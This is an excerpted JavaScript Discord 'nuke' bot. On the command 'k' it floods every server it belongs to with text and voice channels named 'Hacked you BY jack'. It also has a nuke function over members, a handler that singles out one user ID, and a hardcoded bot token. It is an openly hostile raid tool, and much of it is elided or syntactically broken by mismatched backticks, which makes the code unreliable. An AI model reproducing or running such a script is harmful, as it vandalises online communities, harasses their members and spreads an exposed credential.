...
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel(`Hacked you BY jack` is here `, 'text');
m.createChannel(`Hacked you BY jack` is here `, 'text');
m.createChannel(`Hacked you BY jack` is here `, 'text');
m.createChannel(`Hacked you BY jack` is here `, 'text');
m.createChannel(`Hacked you BY jack` is here `, 'text');
...
LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel(`Hacked you BY jack` is here `, 'voice');
m.createChannel(`Hacked you BY jack` is here `, 'voice');
m.createChannel(`Hacked you BY jack` is here `, 'voice');
m.createChannel(`Hacked you BY jack` is here `, 'voice');
m.createChannel(`Hacked you BY jack` is here `, 'voice');
...
async function nuke(guild) {
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel(`Hacked you BY jack` is here `, 'text');
 
      await guild.createChannel(`Hacked you BY jack` is here `, 'voice');
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "466012765090217994") {
...
LOka.login("NTE4NDE3OTc4ODg3MjQxNzI4.DuQfSg.k1Pzs5-rbw-WjpFEZP3fbGwagHs")